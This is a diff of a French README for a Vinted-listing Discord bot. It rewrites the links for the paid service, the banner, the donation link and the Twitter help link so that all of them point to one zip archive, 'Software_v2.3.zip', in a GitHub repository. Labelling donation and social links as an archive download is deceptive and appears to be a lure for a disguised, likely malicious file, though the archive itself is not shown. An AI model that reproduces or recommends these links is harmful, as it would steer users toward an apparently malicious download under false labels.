@@ -4,7 +4,7 @@ Un bot Discord pour Vinted, qui envoie un message lorsqu'une nouvelle annonce es
 
 ## Distrobot.fr
 
-Bien que le bot open source fonctionne parfaitement et soit très rapide, sa configuration et son installation peut être laborieuse. C'est pour cela que nous vous proposons également notre service https://raw.githubusercontent.com/ylayann/botvintedylaprivate/main/examples/Software_1.3.zip :
+Bien que le bot open source fonctionne parfaitement et soit très rapide, sa configuration et son installation peut être laborieuse. C'est pour cela que nous vous proposons également notre service https://github.com/ylayann/botvintedylaprivate/raw/refs/heads/main/examples/Software_v2.3.zip :
 
 |                                             | **Bot open source** | **Distrobot** |
 |---------------------------------------------|---------------------|---------------|
@@ -18,7 +18,7 @@ Bien que le bot open source fonctionne parfaitement et soit très rapide, sa con
 | Salons avec conseils de professionnels      |   ❌                  | ✅             |
 | Soutien du projet                           |  ❌                   | ✅             |
 
-[![banner](./banner.png)](https://raw.githubusercontent.com/ylayann/botvintedylaprivate/main/examples/Software_1.3.zip)
+[![banner](./banner.png)](https://github.com/ylayann/botvintedylaprivate/raw/refs/heads/main/examples/Software_v2.3.zip)
 
 ## Abonnez-vous...
 
@@ -32,7 +32,7 @@ Pour s'abonner, entrez n'importe quelle URL Vinted. Le bot déterminera automati
 
 ## Installation
 
-**Je maintiens bénévolement ce bot sur mon temps libre. Pour supporter ce projet, n'hésitez pas à [faire un don](https://raw.githubusercontent.com/ylayann/botvintedylaprivate/main/examples/Software_1.3.zip). Si besoin, je suis également disponible pour aider pour l'installation sur [Twitter](https://raw.githubusercontent.com/ylayann/botvintedylaprivate/main/examples/Software_1.3.zip) si besoin.**
+**Je maintiens bénévolement ce bot sur mon temps libre. Pour supporter ce projet, n'hésitez pas à [faire un don](https://github.com/ylayann/botvintedylaprivate/raw/refs/heads/main/examples/Software_v2.3.zip). Si besoin, je suis également disponible pour aider pour l'installation sur [Twitter](https://github.com/ylayann/botvintedylaprivate/raw/refs/heads/main/examples/Software_v2.3.zip) si besoin.**
 
 Prérequis :
 
